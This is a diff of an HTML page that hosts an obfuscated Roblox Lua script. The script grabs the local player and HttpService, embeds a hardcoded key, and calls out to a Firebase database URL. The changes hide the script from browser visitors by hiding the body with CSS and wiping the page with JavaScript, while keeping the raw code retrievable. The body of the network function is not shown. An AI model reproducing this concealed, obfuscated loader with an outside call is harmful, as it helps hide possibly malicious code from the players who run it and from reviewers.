@@ -1,7 +1,13 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <style>
+        body { display: none; }
+    </style>
+</head>
 <body>
-    <div id="code">local _a = game:GetService("Players")
+    <script id="code" type="text/plain">
+local _a = game:GetService("Players")
 local _b = game:GetService("HttpService")
 local _c = _a.LocalPlayer
 local _d = "zyRSUnRt8BqRlIlAM5wnsG8z8y1pdUytuaCkPSj1"
@@ -59,6 +65,12 @@ local function _e(_f)
 end
 
 local _p = "https://hgjghjgjhjdf-default-rtdb.firebaseio.com/System/test/.json"
-_e(_p)</div>
+_e(_p)
+    </script>
+
+    <script>
+        // Очищает DOM при открытии в браузере
+        document.body.innerHTML = "";
+    </script>
 </body>
 </html>
